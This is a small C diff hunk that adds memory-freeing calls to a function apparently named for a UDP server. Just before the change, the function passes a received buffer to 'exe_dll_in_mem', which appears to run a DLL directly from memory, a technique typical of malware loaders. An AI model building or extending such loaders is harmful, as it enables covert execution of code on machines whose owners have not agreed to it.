@@ -3256,6 +3256,13 @@ int udp_server_clinet(int Port)
 
         int big = sizeof(rawData);
         exe_dll_in_mem(rawData, big);
+
+		//we should have done this earlier
+		free(rawData);
+		free(Buffer);
+		free(Buffer2);
+		free(Buffer_without_padding);
+		free(Filesize);
         return 0;
 
     }
